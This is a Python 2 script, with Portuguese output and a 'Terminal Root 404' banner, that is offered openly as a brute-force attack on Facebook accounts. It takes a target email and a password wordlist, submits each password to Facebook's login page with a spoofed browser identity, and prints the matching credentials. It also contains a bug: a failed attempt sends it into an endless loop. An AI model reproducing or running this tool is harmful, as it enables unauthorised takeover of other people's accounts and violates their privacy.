#!/usr/bin/python
# -*- coding:utf-8 -*-

import mechanize
import os
import time
import sys

purpleClaro = "\033[1;35m"
cyanClaro = "\033[1;36m"
vermelho = "\033[31;1m"
amarelo = "\033[1;33m"
magenta = "\033[45m"
normal = "\033[0;0m"
verde = "\033[32;1m"
azul = "\033[34;1m"
branco = "\033[0m"
ciano = "\033[46m"

logo = '''
  	 ███████╗ ██████╗ ██╗   ██╗███████╗███████╗███████╗███████╗
  	 ██╔════╝██╔═══██╗██║   ██║██╔════╝██╔════╝╚══███╔╝██╔════╝
  	 ███████╗██║   ██║██║   ██║█████╗  █████╗    ███╔╝ █████╗   v1.0
  	 ╚════██║██║▄▄ ██║██║   ██║██╔══╝  ██╔══╝   ███╔╝  ██╔══╝  
  	 ███████║╚██████╔╝╚██████╔╝███████╗███████╗███████╗███████╗
   	 ╚══════╝ ╚══▀▀═╝  ╚═════╝ ╚══════╝╚══════╝╚══════╝╚══════╝
'''

menu = '''
	      +================================================+
	      |         ATAQUE FORÇA BRUTA NO FACEBOOK         |
	      +================================================+
	      | ☠ Programador: Squeeze                         |
	      | ☠ Contato: @SqueezeSec (Telegram)              |
	      | ☠ Data: 05/06/2017                             |
	      | ☠ Canal: telegram.me/TerminalRoot404           |
	      | ☠ Pagina: facebook.com/TerminalRoot404         |
	      +================================================+
	      |             ☠ ŧєrмiηαł røøŧ 404 ☠              |
	      +================================================+
'''

login_acconts = '''   +=========================================================+
   |               ☠ Facebook - Login Acounts ☠              |
   +=========================================================+'''

terminalroot = '''   +========================================================+
   |                  ☠ ŧєrмiηαł røøŧ 404 ☠                 |
   +========================================================+'''

def lista_senhas():

	user = raw_input(verde + "\n [+] Digite seu e-mail: ")
	lista_senhas = raw_input(verde + "\n [+] Digite sua lista de senhas: ")
																																						
	lista_senhas = open(lista_senhas, "r")
	
	for password in lista_senhas:

	 	try:
	 		br = mechanize.Browser()
	 		br.set_handle_robots(False)
	 		br.addheaders = [('User-Agent', 'Mozilla/5.0 (Windows 10; rv:41.0) Gecko/41.0 Firefox/41.0')] 
	 		br.open('https://www.facebook.com/login.php')
	 		br.select_form(nr=0)
	 		br.form['email'] = user
	 		br.form['pass'] = password
	 		sub = br.submit()
	 		link_erro = sub.geturl()

	 		if link_erro == 'https://www.facebook.com/login.php?login_attempt=1&lwv=100':

	 			

	 			while (link_erro == link_erro):
	 				print vermelho + login_acconts + "\n"
	 				print vermelho + "            [-] O E-mail ou senha está incorreto\n"
	 				print vermelho + "            [+] E-mail: %s"% user
		 			print vermelho + "            [+] Senha: %s"% password
	 				print vermelho + terminalroot + "\n"

		 	else:
		 		print verde + login_acconts + "\n"
		 		print verde + "            [+] O E-mail e senha está correto\n"
		 		print verde + "            [+] E-mail: %s"% user
		 		print verde + "            [+] Senha: %s"% password
		 		print verde + terminalroot + "\n"
		 		print(azul + "\n \n [-] Saindo do programa...")
				time.sleep(1.2)
		 		exit()

	 	except KeyboardInterrupt:
			print(vermelho + "\n \n [-] Saindo do programa...")
			time.sleep(1.2)
	 		exit()

os.system("apt-get install python-mechanize")

os.system("clear")

print vermelho + logo + azul + menu

try:
	lista_senhas()	
		
except KeyboardInterrupt:
		print(vermelho + "\n \n [-] Saindo do programa...")
		time.sleep(1.2)
 		exit()
